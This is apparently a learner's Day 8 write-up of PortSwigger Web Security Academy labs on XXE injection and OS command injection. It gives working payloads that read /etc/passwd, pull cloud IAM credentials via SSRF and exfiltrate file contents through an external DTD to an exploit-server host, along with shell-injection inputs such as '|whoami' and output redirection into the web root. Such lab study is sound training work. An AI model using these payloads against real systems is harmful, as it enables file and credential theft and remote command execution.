# PortSwigger Web Security Academy — XXE Injection & OS Command Injection (Day 8)

My notes and write-ups from Day 8 of learning web application security on [PortSwigger's Web Security Academy](https://portswigger.net/web-security). After **Access Control** on [Day 1](day1-access-control.md), **Authentication** on [Day 2](day2-authentication.md), **SQL Injection** on [Day 3](day3-sql-injection.md), **Cross-Site Scripting** on [Day 4](day4-cross-site-scripting.md), **Business Logic Vulnerabilities** on [Day 5](day5-business-logic-vulnerabilities.md), **Cross-Site Request Forgery** on [Day 6](day6-csrf.md), and **SSRF & Path Traversal** on [Day 7](day7-ssrf-and-path-traversal.md), today's run covers two topics: **XML External Entity (XXE) Injection** (7 of 9 labs) and **OS Command Injection** (3 of 5 labs), for 10 labs total.

## What is XXE injection?

XML external entity injection lets an attacker interfere with an application's parsing of XML input by defining a custom "external entity" whose value is loaded from a file path or URL, rather than declared inline. If the application's XML parser resolves external entities (the default behavior for most parsers unless explicitly disabled), an attacker can read arbitrary files from the server's filesystem, force the server to make outbound HTTP requests (SSRF), or — in blind cases where no output is returned directly — exfiltrate data out-of-band or via triggered parser error messages. Almost every lab below revolves around the same "Check stock" feature, which parses an XML request body server-side.

## What is OS command injection?

OS command injection (shell injection) lets an attacker execute arbitrary operating system commands on the server by injecting shell metacharacters (`&`, `&&`, `|`, `||`, `;`, backticks) into input that gets passed to a shell command. When the command's output is returned directly it's trivial to detect and exploit; when it's "blind" (no output shown), detection instead relies on time delays, redirecting output to a web-accessible file, or out-of-band callbacks.

---

# Part 1: XXE Injection

## Lab 1: Exploiting XXE using external entities to retrieve files
**Difficulty:** Apprentice
**Link:** https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

**Vulnerability:** The "Check stock" feature POSTs an XML body to `/product/stock`, and the server-side XML parser resolves external entities with no restriction.

**Steps:**
1. Found the stock-check request sends `<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>` as `Content-Type: application/xml`.
2. Replaced the body with a `DOCTYPE` declaring an external entity pointing at `file:///etc/passwd`, and referenced that entity inside `<productId>`:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
   ```
3. The "Invalid product ID" error response echoed back the full contents of `/etc/passwd`, solving the lab.

**Takeaway:** The baseline case for this whole topic — with zero restriction on external entities, any XML data value that gets reflected back to the user is a direct file-read primitive.

---

## Lab 2: Exploiting XXE to perform SSRF attacks
**Difficulty:** Apprentice
**Link:** https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

**Vulnerability:** Same stock-check XXE, but the goal is to reach the server's (simulated) EC2 instance metadata endpoint at `http://169.254.169.254/` rather than a local file.

**Steps:**
1. Defined an external entity pointing at `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — the response revealed a role name, `admin`.
2. Re-targeted the entity at `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`, which returned a JSON blob containing the `AccessKeyId` and `SecretAccessKey`, solving the lab.

**Takeaway:** XXE isn't just a file-read bug — an external entity's `SYSTEM` identifier can be any URL, turning the vulnerability into full server-side request forgery against cloud metadata services and other internal-only endpoints.

---

## Lab 3: Exploiting XInclude to retrieve files
**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/xxe/lab-xinclude-attack

**Vulnerability:** This time the request body is plain `application/x-www-form-urlencoded` (`productId=1&storeId=1`) — the client never sends raw XML at all. The server instead embeds the submitted `productId` value into a back-end XML document itself, so there's no `DOCTYPE` to inject into.

**Steps:**
1. Confirmed the default request uses form encoding, not XML — a classic XXE payload has nowhere to declare an external entity, since only a single data value is attacker-controlled, not the whole document.
2. Used an XInclude attack instead, which only needs a single data value to reference an external file: submitted `productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`.
3. The response echoed back the full contents of `/etc/passwd`, solving the lab.

**Takeaway:** When you don't control the whole XML document (so can't define a `DOCTYPE`), XInclude lets you reach the same file-read primitive from within a single data value that later gets embedded into a server-side XML document.

---

## Lab 4: Exploiting XXE via image file upload
**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

**Vulnerability:** A blog comment form lets users attach an avatar image, which the server processes with the Apache Batik library. Since SVG is an XML-based image format, uploading a malicious SVG reaches the same XXE attack surface.

**Steps:**
1. Posted a blog comment with an avatar SVG containing an external entity pointing at `file:///etc/hostname`, rendered inside an `<text>` element:
   ```xml
   <?xml version="1.0" standalone="yes"?>
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
   <svg width="400" height="100" xmlns="http://www.w3.org/2000/svg">
   <rect width="400" height="100" fill="white"/>
   <text x="10" y="60" font-size="30" fill="black">&xxe;</text>
   </svg>
   ```
2. Batik processed the SVG server-side and re-rendered it as a PNG; fetching the resulting avatar image showed the server's hostname (`3575a39dada4`) rendered as text in the image.
3. Submitted that hostname via the lab's "Submit solution" button to solve the lab.

**Takeaway:** Any file format built on XML — SVG, DOCX, and others — carries the same XXE attack surface as a "real" XML API endpoint, even when the application only ever expected an image upload.

---

## Lab 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD
**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration

**Vulnerability:** The stock-check XML parser is vulnerable, but the response never reflects any data back — a "blind" XXE. The lab explicitly allows solving it with the provided exploit server instead of Burp Collaborator.

**Steps:**
1. Hosted a malicious DTD on the lab's exploit server at `/exploit`, using XML parameter entities to read `/etc/hostname` and smuggle it out as a query string on a request back to the exploit server itself:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://exploit-xxx.exploit-server.net/?x=%file;'>">
   %eval;
   %exfil;
   ```
2. Sent a stock-check request whose internal DTD subset pulls in that external DTD via a parameter entity:
   ```xml
   <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://exploit-xxx.exploit-server.net/exploit"> %xxe;]>
   ```
3. Checked the exploit server's access log and found a callback `GET /?x=6d56e57a2674` from the lab server — the exfiltrated hostname — and submitted it to solve the lab.

**Takeaway:** Even when out-of-band interaction is needed, the lab's own exploit server can substitute for Burp Collaborator whenever a lab explicitly allows it — self-hosting the malicious DTD and reading its access log gives the same result as a Collaborator interaction, no Burp Suite required.

---

## Lab 6: Exploiting blind XXE to retrieve data via error messages
**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages

**Vulnerability:** Same blind stock-check XXE, but this time the goal is to trigger a parser error message that leaks file contents directly in the response, avoiding any need for out-of-band interaction at all.

**Steps:**
1. Hosted a DTD on the exploit server that reads `/etc/passwd` and then tries to use it as part of a nonexistent file path, forcing a `FileNotFoundException` whose message contains the file contents:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
   %eval;
   %error;
   ```
2. Referenced that DTD from the stock-check request the same way as Lab 5.
3. The response directly returned `java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash...` — the full contents of `/etc/passwd` — which solved the lab immediately with no manual submission needed.

**Takeaway:** Forcing an XML parser to throw an exception that embeds file contents in its message sidesteps the need for any out-of-band channel entirely — the "blind" vulnerability becomes fully visible again via error-based extraction.

---

## Lab 7: Exploiting XXE to retrieve data by repurposing a local DTD
**Difficulty:** Expert
**Link:** https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd

**Vulnerability:** Same blind stock-check XXE, but this lab blocks out-of-band interactions entirely, and only allows an *internal* DTD subset (no external DTD can be loaded from a remote server) — ruling out both previous techniques directly.

**Steps:**
1. Per the lab's own hint, GNOME systems often ship a DTD at `/usr/share/yelp/dtd/docbookx.dtd` defining an entity called `ISOamso`.
2. Built a hybrid internal/external DTD that imports that local DTD file, then *redefines* its `ISOamso` entity with the same error-based file-read payload from Lab 6 — this loophole (redefining an entity from an external DTD inside an internal one) sidesteps the restriction against nesting parameter entity definitions in a purely internal DTD:
   ```xml
   <!DOCTYPE message [
   <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
   <!ENTITY % ISOamso '
   <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
   <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
   &#x25;eval;
   &#x25;error;
   '>
   %local_dtd;
   ]>
   ```
3. Sent this as the stock-check request's `DOCTYPE`, and the response immediately returned a `FileNotFoundException` containing the full contents of `/etc/passwd`, solving the lab on the first attempt.

**Takeaway:** Even when both out-of-band callbacks *and* external DTDs are blocked, a DTD file that already exists on the server's own filesystem can be "repurposed" — importing it and redefining one of its entities revives the error-based technique from entirely within an internal DTD.

---

## Labs not attempted today

Two labs in this topic were left out of today's run:

- **Blind XXE with out-of-band interaction** and **Blind XXE with out-of-band interaction via XML parameter entities** — both labs state outright that solving them requires triggering a DNS lookup/HTTP request specifically to **Burp Collaborator's default public server**, with the Academy's firewall blocking any other external system. Unlike the exfiltration lab above (which explicitly permits the exploit server as an alternative), these two require the Collaborator client built into Burp Suite, which isn't part of this workflow — same category of skip as the Collaborator-gated labs noted on [Day 6](day6-csrf.md) and [Day 7](day7-ssrf-and-path-traversal.md).

---

# Part 2: OS Command Injection

## Lab 1: OS command injection, simple case
**Difficulty:** Apprentice
**Link:** https://portswigger.net/web-security/os-command-injection/lab-simple

**Vulnerability:** The stock-check feature passes the `storeId` parameter straight into a server-side shell command with no sanitization, and the command's output is returned directly in the response.

**Steps:**
1. Sent a stock-check POST with `storeId=1|whoami` in place of the normal numeric store ID.
2. The response returned `peter-6IT3S7` — the output of the injected `whoami` command — instead of a stock count, solving the lab.

**Takeaway:** The baseline case: with no input sanitization and output reflected directly, a single shell metacharacter (`|`) is enough to run arbitrary commands and see their output immediately.

---

## Lab 2: Blind OS command injection with time delays
**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

**Vulnerability:** A "Submit feedback" form's `email` field is passed into a server-side command (to generate a notification), but no command output is ever returned in the response — a blind injection.

**Steps:**
1. Submitted the feedback form with `email=test@test.com|| ping -c 10 127.0.0.1 ||` in place of a normal email address.
2. The response took roughly 9.7 seconds to arrive (versus a near-instant baseline), confirming the injected `ping` command executed for its full 10-second duration server-side, which solved the lab.

**Takeaway:** When no output is reflected, a controllable time delay (via `ping -c N` or similar) is enough to confirm blind command injection — the response time itself becomes the side channel.

---

## Lab 3: Blind OS command injection with output redirection
**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

**Vulnerability:** Same blind feedback-form injection as Lab 2, but this app also serves static images from a predictable web-root path (`/var/www/images/`) via an `/image?filename=` endpoint, giving a way to retrieve command output indirectly.

**Steps:**
1. Submitted the feedback form with `email=test@test.com|| whoami > /var/www/images/output.txt ||`.
2. Fetched `/image?filename=output.txt` and got back `peter-lbTdqo` — the redirected output of the injected `whoami` command — solving the lab.

**Takeaway:** Even with zero reflected output and no time-based channel needed, redirecting a blind command's output into any file the attacker can later fetch (a web-root, a log directory, anywhere readable over HTTP) turns a blind injection back into a fully readable one.

---

## Labs not attempted today

Two labs in this topic were left out of today's run to keep the day at the usual 10-lab total:

- **Blind OS command injection with out-of-band interaction** and **Blind OS command injection with out-of-band data exfiltration** — both are solved via an `nslookup`/DNS-based OAST payload to Burp Collaborator, the same Collaborator dependency noted for the two skipped XXE labs above.

---

## A note on today's format

Today combines a near-full XXE run (7 of 9 labs — two skipped only for requiring Burp Collaborator specifically, see above) with a partial OS Command Injection run (3 of 5 labs) to reach the usual 10-lab total. One practical note from today: the blind XXE exfiltration and error-based labs (5–7) were driven entirely by scripting requests directly against the lab's exploit server API (`responseFile`/`responseHead`/`responseBody`/`formAction` form fields) rather than through the browser UI — much faster once the field names were known, though it took a couple of failed attempts to notice that Git Bash's automatic `/exploit`-to-Windows-path conversion (MSYS path conversion) was silently corrupting the `responseFile` field until `MSYS_NO_PATHCONV=1` was set.
